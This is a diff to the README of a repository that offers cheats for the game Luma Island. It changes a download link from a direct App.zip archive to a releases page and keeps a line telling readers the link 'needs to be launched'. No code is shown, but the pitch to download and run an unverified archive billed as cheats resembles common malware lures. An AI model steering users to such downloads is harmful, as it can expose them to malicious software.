@@ -33,7 +33,7 @@ Welcome to the Luma Island Cheats repository! This is your ultimate destination 
 - **luma-island-mods**
 - **luma-island-pc**
 
-## Download Here ➡️ [Download Luma Island Cheats](https://github.com/repo/releases/9246/App.zip)
+## Download Here ➡️ [Download Luma Island Cheats](https://github.com/rosariocala/Luma-Island-Cheats/releases)
 
 ### Note: This link needs to be launched for downloading the cheats.
 
